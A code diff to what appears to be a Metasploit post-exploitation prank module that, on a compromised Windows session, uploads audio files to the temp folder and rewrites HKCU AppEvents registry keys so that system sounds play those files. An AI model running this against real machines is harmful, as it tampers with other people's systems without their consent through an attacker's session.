@@ -258,32 +258,32 @@ class Metasploit3 < Msf::Post
 		rick_system_sounds_path = ::File.join(Msf::Config.install_root, "data", "post")
 		rick_system_sounds_path = ::File.join(rick_system_sounds_path, "rickloaf_system_sounds")
 		win_media_path = "C:\\WINDOWS\\media"
+		temp_media_path = client.fs.file.expand_path("%TEMP%")
 		if winver=~/Windows 7/
 			# TODO CHANGE TO THE REGISTRY KEYS
-			rick_system_file_dict = {"Windows Critical Stop.wav" => "CriticalStop.wav",
-			 "Windows Ding.wav" => "Dings.wav",
-			 "Windows Error.wav" => "Error.wav",
-			 "Windows Exclamation.wav" => "Exclamation.wav",
-			 "Windows Logoff Sound.wav" => "Logoff.wav",
-			 "Windows Logon Sound.wav" => "Logon.wav",
-			 "Windows Notify.wav" => "Notifys.wav",
-			 "Windows Pop-up Blocked.wav" => "PopupBlock.wav",
-			 "Windows Shutdown.wav" => "Shutdown.wav",
-			 "Windows Startup.wav" => "Startup.wav"
+			rick_system_file_dict = {"HKCU\\AppEvents\\Schemes\\Apps\\.Default\\SystemAsterisk\\.Current" => "CriticalStop.wav",
+			 "HKCU\\AppEvents\\Schemes\\Apps\\.Default\\.Default\\.Current" => "Dings.wav",
+			 "HKCU\\AppEvents\\Schemes\\Apps\\.Default\\SystemHand\\.Current" => "Error.wav",
+			 "HKCU\\AppEvents\\Schemes\\Apps\\.Default\\SystemExclamation\\.Current" => "Exclamation.wav",
+			 "HKCU\\AppEvents\\Schemes\\Apps\\.Default\\WindowsLogoff\\.Current" => "Logoff.wav",
+			 "HKCU\\AppEvents\\Schemes\\Apps\\.Default\\WindowsLogon\\.Current" => "Logon.wav",
+			 "HKCU\\AppEvents\\Schemes\\Apps\\.Default\\SystemNotification\\.Current" => "Notifys.wav",
+			 "HKCU\\AppEvents\\Schemes\\Apps\\.Default\\SystemExit\\.Current" => "Shutdown.wav",
 			}
-			rick_system_file_dict.each do |remote_rick_filename, local_rick_filename|
+			rick_system_file_dict.each do |registry_key, local_rick_filename|
 				rick_audio = ::File.join(rick_system_sounds_path, local_rick_filename)
-				media_file = win_media_path + "\\" + local_rick_filename 
+				media_file = temp_media_path + "\\" + local_rick_filename 
 				print_status "uploading #{media_file}"
 				client.fs.file.upload_file(media_file, rick_audio)
-				# TODO Change the registry key of .current for each event in HKCU/ AppEvents/ Schemes/ Apps/ .Default/ <eventname> / .current
+				print_status "writing registry key #{registry_key}: to #{media_file}"
+				registry_setvaldata(registry_key,"","#{media_file}","REG_SZ")
+
 			end
 		elsif winver=~/Windows XP/
 			rick_system_file_dict = {"Windows XP Critical Stop.wav" => "CriticalStop.wav",
 			 "Windows XP Ding.wav" => "Dings.wav",
 			 "Windows XP Error.wav" => "Error.wav",
-			 "Windows XP Exclamation.wav" => "Exclamation.wav",
-			 "Windows XP Logoff Sound.wav" => "Logoff.wav",
+			 "Windows XP Exclamation.wav" => "Exclamation.wav", "Windows XP Logoff Sound.wav" => "Logoff.wav",
 			 "Windows XP Logon Sound.wav" => "Logon.wav",
 			 "Windows XP Notify.wav" => "Notifys.wav",
 			 "Windows XP Pop-up Blocked.wav" => "PopupBlock.wav",
